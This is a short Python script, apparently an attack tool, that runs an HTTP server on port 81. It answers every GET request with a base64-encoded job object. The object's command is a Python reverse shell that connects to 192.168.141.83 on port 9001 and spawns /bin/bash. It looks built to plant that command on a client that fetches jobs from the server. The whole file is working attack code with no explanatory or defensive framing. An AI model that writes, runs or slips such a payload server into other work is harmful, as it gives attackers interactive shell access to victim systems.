import http.server
import socketserver
import base64

PORT = 81

class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.end_headers()

        # Data to be encoded in base64
        data = b'{"job_id": 15, "cmd": "python3 -c \'import os,pty,socket;s=socket.socket();s.connect((\\"192.168.141.83\\",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\\"/bin/bash\\")\'"}'
        
        # Base64-encode the data
        encoded_data = base64.b64encode(data)

        # Write the base64-encoded data to the response
        self.wfile.write(encoded_data)

with socketserver.TCPServer(("", PORT), MyRequestHandler) as httpd:
    print("Server listening on port", PORT)
    httpd.serve_forever()
